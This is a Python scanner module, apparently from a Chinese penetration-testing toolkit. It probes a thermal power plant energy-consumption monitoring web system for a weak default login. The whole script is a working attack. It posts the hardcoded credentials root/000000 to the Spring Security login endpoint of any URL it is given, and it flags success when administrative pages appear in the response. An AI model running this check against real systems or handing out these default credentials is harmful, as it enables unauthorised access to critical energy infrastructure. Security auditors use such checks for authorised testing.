#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 火力发电能耗监测弱口令
referer: http://www.wooyun.org/bugs/wooyun-2015-0145739
author: Lucifer
description: 火力发电能耗监测弱口令。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class rockontrol_weak_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/j_spring_security_check"
        vulnurl = self.url + payload
        post_data = {
            "j_username":"root",
            "j_password":"000000",
            "submit1":"%E7%99%BB%E5%BD%95"
        }
        try:
            sess = requests.Session()
            req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"resource.action" in req.text and r"authority.action" in req.text:
                cprint("[+]存在火力发电能耗监测弱口令漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = rockontrol_weak_BaseVerify(sys.argv[1])
    testVuln.run()